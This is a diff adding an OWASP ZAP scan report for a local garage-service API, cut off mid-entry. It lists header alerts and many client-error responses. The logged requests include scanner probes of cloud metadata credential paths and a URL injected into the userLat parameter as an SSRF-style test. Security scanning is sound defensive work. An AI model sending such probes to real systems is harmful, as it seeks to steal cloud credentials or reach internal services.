@@ -1,0 +1,3751 @@
+{
+	"@programName": "ZAP",
+	"@version": "2.17.0",
+	"@generated": "Thu, 8 Oct 2026 10:39:16",
+	"created": "2026-10-08T10:39:16.083358758Z",
+	"insights":[
+		{
+			"level": "Low",
+			"reason": "Exceeded High",
+			"site": "http://host.docker.internal:5183",
+			"key": "insight.code.4xx",
+			"description": "Percentage of responses with status code 4xx",
+			"statistic": "99"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:5183",
+			"key": "insight.code.2xx",
+			"description": "Percentage of responses with status code 2xx",
+			"statistic": "100"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:5183",
+			"key": "insight.endpoint.ctype.application/json",
+			"description": "Percentage of endpoints with content type application/json",
+			"statistic": "5"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:5183",
+			"key": "insight.endpoint.ctype.application/problem+json",
+			"description": "Percentage of endpoints with content type application/problem+json",
+			"statistic": "2"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:5183",
+			"key": "insight.endpoint.method.DELETE",
+			"description": "Percentage of endpoints with method DELETE",
+			"statistic": "4"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:5183",
+			"key": "insight.endpoint.method.GET",
+			"description": "Percentage of endpoints with method GET",
+			"statistic": "42"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:5183",
+			"key": "insight.endpoint.method.POST",
+			"description": "Percentage of endpoints with method POST",
+			"statistic": "49"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:5183",
+			"key": "insight.endpoint.method.PUT",
+			"description": "Percentage of endpoints with method PUT",
+			"statistic": "2"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:5183",
+			"key": "insight.endpoint.total",
+			"description": "Count of total endpoints",
+			"statistic": "336"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:5183",
+			"key": "insight.response.slow",
+			"description": "Percentage of slow responses",
+			"statistic": "3"
+		}
+	],
+	"site":[ 
+		{
+			"@name": "http://host.docker.internal:5183",
+			"@host": "host.docker.internal",
+			"@port": "5183",
+			"@ssl": "false",
+			"alerts": [ 
+				{
+					"pluginid": "90004",
+					"alertRef": "90004-1",
+					"alert": "Cross-Origin-Resource-Policy Header Missing or Invalid",
+					"name": "Cross-Origin-Resource-Policy Header Missing or Invalid",
+					"riskcode": "1",
+					"confidence": "2",
+					"riskdesc": "Low (Medium)",
+					"desc": "<p>Cross-Origin-Resource-Policy header is an opt-in header designed to counter side-channels attacks like Spectre. Resource should be specifically set as shareable amongst different origins.</p>",
+					"instances":[ 
+						{
+							"id": "271",
+							"uri": "http://host.docker.internal:5183/api/Garages/partnered?userLat=1.2&userLng=1.2&radiusKm=20",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Garages\/partnered (radiusKm,userLat,userLng)",
+							"method": "GET",
+							"param": "Cross-Origin-Resource-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "12",
+							"uri": "http://host.docker.internal:5183/swagger/v1/swagger.json",
+							"nodeName": "http:\/\/host.docker.internal:5183\/swagger\/v1\/swagger.json",
+							"method": "GET",
+							"param": "Cross-Origin-Resource-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						}
+					],
+					"count": "2",
+					"systemic": false,
+					"solution": "<p>Ensure that the application/web server sets the Cross-Origin-Resource-Policy header appropriately, and that it sets the Cross-Origin-Resource-Policy header to 'same-origin' for all web pages.</p><p>'same-site' is considered as less secured and should be avoided.</p><p>If resources must be shared, set the header to 'cross-origin'.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that supports the Cross-Origin-Resource-Policy header (https://caniuse.com/mdn-http_headers_cross-origin-resource-policy).</p>",
+					"otherinfo": "",
+					"reference": "<p>https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Embedder-Policy</p>",
+					"cweid": "693",
+					"wascid": "14",
+					"sourceid": "32"
+				},
+				{
+					"pluginid": "100001",
+					"alertRef": "100001",
+					"alert": "Unexpected Content-Type was returned",
+					"name": "Unexpected Content-Type was returned",
+					"riskcode": "1",
+					"confidence": "3",
+					"riskdesc": "Low (High)",
+					"desc": "<p>A Content-Type of text/html was returned by the server.</p><p>This is not one of the types expected to be returned by an API.</p><p>Raised by the 'Alert on Unexpected Content Types' script</p>",
+					"instances":[ 
+						{
+							"id": "9414",
+							"uri": "http://host.docker.internal:5183/swagger/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/swagger\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "text/html",
+							"otherinfo": ""
+						},
+						{
+							"id": "9413",
+							"uri": "http://host.docker.internal:5183/swagger/index.html",
+							"nodeName": "http:\/\/host.docker.internal:5183\/swagger\/index.html",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "text/html",
+							"otherinfo": ""
+						}
+					],
+					"count": "2",
+					"systemic": false,
+					"solution": "",
+					"otherinfo": "",
+					"reference": "",
+					"cweid": "-1",
+					"wascid": "-1",
+					"sourceid": "9543"
+				},
+				{
+					"pluginid": "10021",
+					"alertRef": "10021",
+					"alert": "X-Content-Type-Options Header Missing",
+					"name": "X-Content-Type-Options Header Missing",
+					"riskcode": "1",
+					"confidence": "2",
+					"riskdesc": "Low (Medium)",
+					"desc": "<p>The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.</p>",
+					"instances":[ 
+						{
+							"id": "270",
+							"uri": "http://host.docker.internal:5183/api/Garages/partnered?userLat=1.2&userLng=1.2&radiusKm=20",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Garages\/partnered (radiusKm,userLat,userLng)",
+							"method": "GET",
+							"param": "x-content-type-options",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.\nAt \"High\" threshold this scan rule will not alert on client or server error responses."
+						},
+						{
+							"id": "10",
+							"uri": "http://host.docker.internal:5183/swagger/v1/swagger.json",
+							"nodeName": "http:\/\/host.docker.internal:5183\/swagger\/v1\/swagger.json",
+							"method": "GET",
+							"param": "x-content-type-options",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.\nAt \"High\" threshold this scan rule will not alert on client or server error responses."
+						}
+					],
+					"count": "2",
+					"systemic": false,
+					"solution": "<p>Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.</p>",
+					"otherinfo": "<p>This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.</p><p>At \"High\" threshold this scan rule will not alert on client or server error responses.</p>",
+					"reference": "<p>https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941(v=vs.85)</p><p>https://owasp.org/www-community/Security_Headers</p>",
+					"cweid": "693",
+					"wascid": "15",
+					"sourceid": "32"
+				},
+				{
+					"pluginid": "100000",
+					"alertRef": "100000-1",
+					"alert": "A Client Error response code was returned by the server",
+					"name": "A Client Error response code was returned by the server",
+					"riskcode": "0",
+					"confidence": "3",
+					"riskdesc": "Informational (High)",
+					"desc": "<p>A response code of 404 was returned by the server.</p><p>This may indicate that the application is failing to handle unexpected input correctly.</p><p>Raised by the 'Alert on HTTP Response Code Error' script</p>",
+					"instances":[ 
+						{
+							"id": "5",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations/id",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations\/id",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9306",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations/id/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations\/id\/",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "41",
+							"uri": "http://host.docker.internal:5183/api/Notifications/id",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications\/id",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9311",
+							"uri": "http://host.docker.internal:5183/api/Notifications/id/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications\/id\/",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "57",
+							"uri": "http://host.docker.internal:5183/api/Uploads/image/publicId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Uploads\/image\/publicId",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9321",
+							"uri": "http://host.docker.internal:5183/api/Uploads/image/publicId/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Uploads\/image\/publicId\/",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "64",
+							"uri": "http://host.docker.internal:5183/api/Vehicles/my-vehicles/vehicleId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Vehicles\/my-vehicles\/vehicleId",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9324",
+							"uri": "http://host.docker.internal:5183/api/Vehicles/my-vehicles/vehicleId/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Vehicles\/my-vehicles\/vehicleId\/",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "6943",
+							"uri": "http://host.docker.internal:5183/computeMetadata/v1/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/computeMetadata\/v1\/",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "6941",
+							"uri": "http://host.docker.internal:5183/latest/meta-data/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/latest\/meta-data\/",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "7037",
+							"uri": "http://host.docker.internal:5183/metadata/instance",
+							"nodeName": "http:\/\/host.docker.internal:5183\/metadata\/instance",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "7050",
+							"uri": "http://host.docker.internal:5183/metadata/v1",
+							"nodeName": "http:\/\/host.docker.internal:5183\/metadata\/v1",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "6945",
+							"uri": "http://host.docker.internal:5183/opc/v1/instance/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/opc\/v1\/instance\/",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "6986",
+							"uri": "http://host.docker.internal:5183/opc/v2/instance/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/opc\/v2\/instance\/",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "7060",
+							"uri": "http://host.docker.internal:5183/openstack/latest/meta_data.json",
+							"nodeName": "http:\/\/host.docker.internal:5183\/openstack\/latest\/meta_data.json",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "545",
+							"uri": "http://host.docker.internal:5183",
+							"nodeName": "http:\/\/host.docker.internal:5183",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9332",
+							"uri": "http://host.docker.internal:5183/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "76",
+							"uri": "http://host.docker.internal:5183/8534236560669463781",
+							"nodeName": "http:\/\/host.docker.internal:5183\/8534236560669463781",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "611",
+							"uri": "http://host.docker.internal:5183/api",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9333",
+							"uri": "http://host.docker.internal:5183/api/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "77",
+							"uri": "http://host.docker.internal:5183/api/135684553776588493",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/135684553776588493",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "617",
+							"uri": "http://host.docker.internal:5183/api/Admin",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9337",
+							"uri": "http://host.docker.internal:5183/api/Admin/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "78",
+							"uri": "http://host.docker.internal:5183/api/Admin/389861911207271323",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/389861911207271323",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "0",
+							"uri": "http://host.docker.internal:5183/api/Admin/assigned-vehicles",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/assigned-vehicles",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9336",
+							"uri": "http://host.docker.internal:5183/api/Admin/assigned-vehicles/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/assigned-vehicles\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "640",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9338",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "79",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations/1944222593218198241",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations\/1944222593218198241",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "10592",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations/actuator/health",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations\/actuator\/health",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "1",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations/all",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations\/all",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9340",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations/all/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations\/all\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "649",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations/id",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations\/id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "9343",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations/id/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations\/id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "80",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations/id/1326731952568465699",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations\/id\/1326731952568465699",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "2",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations/pending",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations\/pending",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9342",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations/pending/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations\/pending\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "660",
+							"uri": "http://host.docker.internal:5183/api/Auth",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9344",
+							"uri": "http://host.docker.internal:5183/api/Auth/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "81",
+							"uri": "http://host.docker.internal:5183/api/Auth/2016171242419299373",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth\/2016171242419299373",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "677",
+							"uri": "http://host.docker.internal:5183/api/CheckupRequests",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/CheckupRequests",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "9346",
+							"uri": "http://host.docker.internal:5183/api/CheckupRequests/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/CheckupRequests\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "82",
+							"uri": "http://host.docker.internal:5183/api/CheckupRequests/362018442589463168",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/CheckupRequests\/362018442589463168",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "26",
+							"uri": "http://host.docker.internal:5183/api/CheckupRequests/id",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/CheckupRequests\/id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9347",
+							"uri": "http://host.docker.internal:5183/api/CheckupRequests/id/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/CheckupRequests\/id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "83",
+							"uri": "http://host.docker.internal:5183/api/CheckupRequests/id/3577683086552651246",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/CheckupRequests\/id\/3577683086552651246",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "18",
+							"uri": "http://host.docker.internal:5183/api/CheckupRequests/my-requests",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/CheckupRequests\/my-requests",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9349",
+							"uri": "http://host.docker.internal:5183/api/CheckupRequests/my-requests/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/CheckupRequests\/my-requests\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "32",
+							"uri": "http://host.docker.internal:5183/api/CheckupRequests/organization-requests",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/CheckupRequests\/organization-requests",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9348",
+							"uri": "http://host.docker.internal:5183/api/CheckupRequests/organization-requests/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/CheckupRequests\/organization-requests\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "696",
+							"uri": "http://host.docker.internal:5183/api/Garages",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Garages",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9352",
+							"uri": "http://host.docker.internal:5183/api/Garages/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Garages\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "84",
+							"uri": "http://host.docker.internal:5183/api/Garages/8253695020896695803",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Garages\/8253695020896695803",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "710",
+							"uri": "http://host.docker.internal:5183/api/Garages/partnered?userLat=http%3A%2F%2Fwww.google.com%2F&userLng=1.2&radiusKm=20",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Garages\/partnered (radiusKm,userLat,userLng)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "711",
+							"uri": "http://host.docker.internal:5183/api/Notifications",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9354",
+							"uri": "http://host.docker.internal:5183/api/Notifications/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "85",
+							"uri": "http://host.docker.internal:5183/api/Notifications/3565713753482796012",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications\/3565713753482796012",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "715",
+							"uri": "http://host.docker.internal:5183/api/Notifications/id",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications\/id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "9355",
+							"uri": "http://host.docker.internal:5183/api/Notifications/id/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications\/id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "86",
+							"uri": "http://host.docker.internal:5183/api/Notifications/id/5210868164612536308",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications\/id\/5210868164612536308",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "38",
+							"uri": "http://host.docker.internal:5183/api/Notifications/my-notifications",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications\/my-notifications",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9357",
+							"uri": "http://host.docker.internal:5183/api/Notifications/my-notifications/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications\/my-notifications\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "39",
+							"uri": "http://host.docker.internal:5183/api/Notifications/sent-notifications",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications\/sent-notifications",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9356",
+							"uri": "http://host.docker.internal:5183/api/Notifications/sent-notifications/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications\/sent-notifications\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "43",
+							"uri": "http://host.docker.internal:5183/api/Notifications/unread-count",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications\/unread-count",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9359",
+							"uri": "http://host.docker.internal:5183/api/Notifications/unread-count/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications\/unread-count\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "728",
+							"uri": "http://host.docker.internal:5183/api/Payments",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Payments",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9361",
+							"uri": "http://host.docker.internal:5183/api/Payments/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Payments\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "87",
+							"uri": "http://host.docker.internal:5183/api/Payments/7787368243858337585",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Payments\/7787368243858337585",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "740",
+							"uri": "http://host.docker.internal:5183/api/ServiceRecords",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/ServiceRecords",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "9362",
+							"uri": "http://host.docker.internal:5183/api/ServiceRecords/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/ServiceRecords\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "88",
+							"uri": "http://host.docker.internal:5183/api/ServiceRecords/7179541724190351824",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/ServiceRecords\/7179541724190351824",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "47",
+							"uri": "http://host.docker.internal:5183/api/ServiceRecords/my-records",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/ServiceRecords\/my-records",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9363",
+							"uri": "http://host.docker.internal:5183/api/ServiceRecords/my-records/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/ServiceRecords\/my-records\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "746",
+							"uri": "http://host.docker.internal:5183/api/ServiceRecords/vehicle",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/ServiceRecords\/vehicle",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9365",
+							"uri": "http://host.docker.internal:5183/api/ServiceRecords/vehicle/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/ServiceRecords\/vehicle\/",
